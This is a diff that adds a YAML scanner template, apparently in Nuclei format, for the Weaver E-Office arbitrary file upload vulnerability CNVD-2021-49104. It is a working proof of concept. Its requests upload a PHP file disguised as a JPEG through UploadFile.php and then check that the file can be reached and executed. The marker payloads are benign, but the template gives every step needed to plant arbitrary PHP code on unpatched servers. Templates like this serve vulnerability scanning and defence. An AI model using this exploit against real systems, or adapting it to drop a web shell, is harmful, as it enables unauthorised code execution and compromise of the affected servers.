@@ -1,0 +1,55 @@
+id: yaml-poc-weaver-weaver_e_office-file_upload-CNVD-2021-49104
+info:
+  name: Yaml Poc Weaver Weaver_E_Office File_Upload Cnvd 2021 49104
+  author: jiahao.sun
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-weaver-weaver_e_office-file_upload-CNVD-2021-49104'
+  tags: fileupload
+  reference:
+  - https://chowdera.com/2021/12/202112190747169542.html
+http:
+- method: POST
+  path:
+  - /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=
+  body: "--{{randomBoundary}}\r\nContent-Disposition: form-data; name=\"Filedata\"\
+    ; filename=\"{{r1}}.php\"\r\nContent-Type: image/jpeg\r\n\n<?php echo \"{{r1}}\"\
+    ; unlink(__FILE__); ?>\r\n--{{randomBoundary}}--\r\n"
+  headers:
+    Content-Type: multipart/form-data; boundary={{randomBoundary}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - logo-eoffice.php
+- method: GET
+  path:
+  - /images/logo/logo-eoffice.php
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: POST
+  path:
+  - /general/index/UploadFile.php?m=uploadPicture&uploadType=theme&userId=
+  body: "--{{randomBoundary}}\r\nContent-Disposition: form-data; name=\"Filedata\"\
+    ; filename=\"test.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\necho md5({{r2}});\r\
+    \n?>\r\n --{{randomBoundary}}--"
+  headers:
+    Content-Type: multipart/form-data; boundary={{randomBoundary}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - name
